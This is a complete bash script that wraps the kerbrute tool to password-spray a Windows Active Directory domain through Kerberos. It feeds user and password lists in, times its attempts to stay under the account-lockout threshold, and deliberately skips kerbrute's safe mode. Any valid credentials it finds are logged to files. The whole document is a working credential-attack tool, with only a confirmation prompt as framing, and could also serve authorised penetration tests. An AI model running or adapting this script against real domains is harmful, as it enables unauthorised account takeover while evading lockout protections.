#!/bin/bash

## VARIABLES
DOMAIN="$1"
USERFILE="$2"
PASSFILE="$3"
SLEEP="$4"
ATTEMPTSLOCKOUT="$5"
KERBRUTE_PATH="$6"

PWD=$(pwd)
LOG_FILE="logs/kerbrute_spray_logs.txt"
USERPASS_FILE="logs/kerbrute_userpass.txt"
SUCCESS_FILE="logs/success_credentials.txt"

## HELP FUNCTION
print_help() {
    echo "Usage: $(basename $0) <Domain> <Users file> <Passwords file> <Sleep minutes> <AttemptsPerLockoutPeriod> [KerbrutePath]"
    echo "Example: $(basename $0) valuecare.local users.txt passwords.txt 15 7"
    echo "Example: $(basename $0) valuecare.local users.txt passwords.txt 15 7 ./kerbrute_linux_amd64"
}

## INSTALL KERBRUTE IF NOT FOUND
install_kerbrute() {
    echo "Kerbrute not found. Downloading..."
    
    ARCH=$(uname -m)
    case $ARCH in
        x86_64) ARCH="amd64" ;;
        aarch64) ARCH="arm64" ;;
        *) ARCH="amd64" ;;
    esac
    
    KERBRUTE_URL="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_${ARCH}"
    KERBRUTE_BINARY="kerbrute_linux_${ARCH}"
    
    if command -v wget &> /dev/null; then
        wget -O "$KERBRUTE_BINARY" "$KERBRUTE_URL"
    elif command -v curl &> /dev/null; then
        curl -L -o "$KERBRUTE_BINARY" "$KERBRUTE_URL"
    else
        echo "Error: Neither wget nor curl available. Please install kerbrute manually."
        exit 1
    fi
    
    chmod +x "$KERBRUTE_BINARY"
    echo "Kerbrute installed successfully as ./$KERBRUTE_BINARY"
    echo "./$KERBRUTE_BINARY"
}

## VALIDATE INPUTS
if [ -z "$DOMAIN" ]; then
    echo "Error: Provide me with a DOMAIN"
    print_help
    exit 1
fi

if [ -z "$USERFILE" ]; then
    echo "Error: Provide me with a users file"
    print_help
    exit 2
elif [ ! -f "$USERFILE" ]; then
    echo "Error: Users file doesn't exist"
    print_help
    exit 3
fi

if [ -z "$PASSFILE" ]; then
    echo "Error: Provide me with a password file"
    print_help
    exit 4
elif [ ! -f "$PASSFILE" ]; then
    echo "Error: Passwords file doesn't exist"
    print_help
    exit 5
fi

if [ -z "$SLEEP" ]; then
    echo "Error: Provide me with a number of minutes to sleep"
    print_help
    exit 6
fi

if [ -z "$ATTEMPTSLOCKOUT" ]; then
    ATTEMPTSLOCKOUT=7
    echo "Using safe default: 7 attempts per lockout period"
fi

## FIND OR INSTALL KERBRUTE
if [ -z "$KERBRUTE_PATH" ]; then
    if [ -f "./kerbrute_linux_amd64" ]; then
        KERBRUTE_PATH="./kerbrute_linux_amd64"
        echo "Using kerbrute from current directory: kerbrute_linux_amd64"
    elif command -v kerbrute &> /dev/null; then
        KERBRUTE_PATH="kerbrute"
        echo "Using kerbrute from PATH"
    else
        KERBRUTE_PATH=$(install_kerbrute)
    fi
else
    if [ ! -f "$KERBRUTE_PATH" ]; then
        echo "Error: kerbrute binary not found at: $KERBRUTE_PATH"
        exit 11
    fi
fi

## VERIFY KERBRUTE WORKS
echo "Testing kerbrute..."
$KERBRUTE_PATH --help &> /dev/null
if [ $? -ne 0 ]; then
    echo "Error: Kerbrute test failed. Please install manually."
    echo "Download from: https://github.com/ropnop/kerbrute/releases"
    exit 12
fi
echo "Kerbrute verified successfully"

## BANNER
echo " "
echo "KERBRUTE PASSWORD SPRAY TOOL"
echo "Domain: $DOMAIN"
echo "Users: $USERFILE" 
echo "Passwords: $PASSFILE"
echo "Kerbrute: $KERBRUTE_PATH"
echo " "

## VARIABLES
SLEEP_SECONDS=$((SLEEP * 60))
PASSWORDCOUNT=$(wc -l < "$PASSFILE")
USERCOUNT=$(wc -l < "$USERFILE")

# Statistics tracking
TOTAL_SUCCESSFUL_LOGINS=0
START_TIME=$(date +%s)

## MAKE DIRECTORY
if [ ! -d "$PWD/logs" ]; then
  mkdir -p logs
fi

## PRINT SPRAY INFO
echo "SPRAY STRATEGY:"
echo "  - Target: $USERCOUNT users and $PASSWORDCOUNT passwords"
echo "  - Safety: $ATTEMPTSLOCKOUT attempts then $SLEEP min sleep"
echo "  - Lockout Buffer: $((10 - ATTEMPTSLOCKOUT)) attempts safety margin"
echo " "

## SAFETY CONFIRMATION
read -p "Start password spraying? (y/N) " prompt
echo " "

## FUNCTION TO PROCESS EACH PASSWORD
process_password() {
    local password="$1"
    local attempt_count="$2"
    local total_attempts="$3"
    
    echo "=== [Attempt $attempt_count/$total_attempts] Spraying: $password ==="
    
    # Run kerbrute WITHOUT --safe flag (too sensitive) but with conservative settings
    OUTPUT=$($KERBRUTE_PATH passwordspray -d "$DOMAIN" -t 2 --delay 100 "$USERFILE" "$password" 2>&1)
    local exit_code=$?
    
    # Check for successful logins
    local success_count=0
    while IFS= read -r line; do
        if [[ "$line" == *"[+] VALID LOGIN:"* ]]; then
            local username=$(echo "$line" | awk '{print $4}' | cut -d'@' -f1)
            echo -e "\033[1;32m"
            echo "================================================================"
            echo "*** SUCCESS: ${DOMAIN}\\${username}:${password} ***"
            echo "================================================================"
            echo -e "\033[0m"
            echo "$(date +%H:%M:%S) - [+] ${username}:${password} - LOGON SUCCESS" | tee -a "$LOG_FILE"
            echo "*** FOUND VALID CREDENTIALS: ${DOMAIN}\\${username}:${password} ***" | tee -a "$SUCCESS_FILE"
            echo "${username}:${password}" >> "$USERPASS_FILE"
            ((success_count++))
            ((TOTAL_SUCCESSFUL_LOGINS++))
        fi
    done <<< "$OUTPUT"
    
    # Check for errors (but don't stop execution)
    if [ $exit_code -ne 0 ]; then
        echo "Warning: Kerbrute exited with code $exit_code for password: $password"
        echo "Output: $OUTPUT" >> "$LOG_FILE"
    fi
    
    # Display results for this password
    if [ $success_count -gt 0 ]; then
        echo -e "\033[1;32m✓ Found $success_count valid credential(s) with password: $password\033[0m"
    else
        echo "✗ No valid credentials found with password: $password"
    fi
    
    echo "----------------------------------------------------------------"
    
    return $success_count
}

## MAIN EXECUTION
if [[ $prompt == "y" || $prompt == "Y" || $prompt == "yes" || $prompt == "Yes" ]]; then

    echo "STARTING PASSWORD SPRAY..."
    echo "Spraying $PASSWORDCOUNT passwords against $USERCOUNT users"
    echo "Configuration: $ATTEMPTSLOCKOUT passwords → $SLEEP min sleep → repeat"
    echo " "
    
    # Initialize counters
    ATTEMPTSLOCKOUT_COUNT=0
    PASSWORDS_PROCESSED=0
    
    # Read passwords into array to handle empty lines and special characters
    mapfile -t passwords < "$PASSFILE"
    
    # Process each password
    for ((i=0; i<${#passwords[@]}; i++)); do
        PASSWORD="${passwords[$i]}"
        
        # Skip empty passwords
        if [ -z "$PASSWORD" ]; then
            continue
        fi
        
        PASSWORDS_PROCESSED=$((PASSWORDS_PROCESSED + 1))
        ATTEMPTSLOCKOUT_COUNT=$((ATTEMPTSLOCKOUT_COUNT + 1))
        
        # Process this password
        process_password "$PASSWORD" "$PASSWORDS_PROCESSED" "$PASSWORDCOUNT"
        
        # Check if we need to take a break
        if [ $ATTEMPTSLOCKOUT_COUNT -eq $ATTEMPTSLOCKOUT ]; then
            echo " "
            echo "=== SAFETY PAUSE ==="
            echo "Completed $ATTEMPTSLOCKOUT password attempts"
            echo "Waiting $SLEEP minutes before continuing..."
            echo " "
            
            # Countdown timer
            for ((min=SLEEP; min>0; min--)); do
                for ((sec=59; sec>=0; sec--)); do
                    echo -ne "Resuming in: ${min}m ${sec}s   \r"
                    sleep 1
                done
            done
            
            echo " "
            echo "Resuming spray..."
            echo " "
            
            # Reset counter
            ATTEMPTSLOCKOUT_COUNT=0
        fi
    done

    ## FINAL STATISTICS
    END_TIME=$(date +%s)
    TOTAL_RUNTIME=$((END_TIME - START_TIME))
    
    echo " "
    echo "=== SPRAY COMPLETED ==="
    echo "FINAL STATISTICS:"
    echo "  - Passwords processed: $PASSWORDS_PROCESSED/$PASSWORDCOUNT"
    echo "  - Total runtime: $(($TOTAL_RUNTIME / 3600))h:$(($TOTAL_RUNTIME % 3600 / 60))m:$(($TOTAL_RUNTIME % 60))s"
    
    if [ $TOTAL_SUCCESSFUL_LOGINS -gt 0 ]; then
        echo -e "  - \033[1;32mSuccessful logins: $TOTAL_SUCCESSFUL_LOGINS\033[0m"
        echo " "
        echo -e "\033[1;32m=== VALID CREDENTIALS FOUND ===\033[0m"
        echo -e "\033[1;32mSaved to: $USERPASS_FILE\033[0m"
        echo " "
        if [ -f "$USERPASS_FILE" ]; then
            echo -e "\033[1;32mDiscovered credentials:\033[0m"
            while IFS= read -r credential; do
                echo -e "\033[1;32m  $credential\033[0m"
            done < "$USERPASS_FILE"
        fi
    else
        echo "  - Successful logins: 0"
        echo " "
        echo "No valid credentials found."
    fi

    exit 0
fi

echo "Operation cancelled"
exit 0
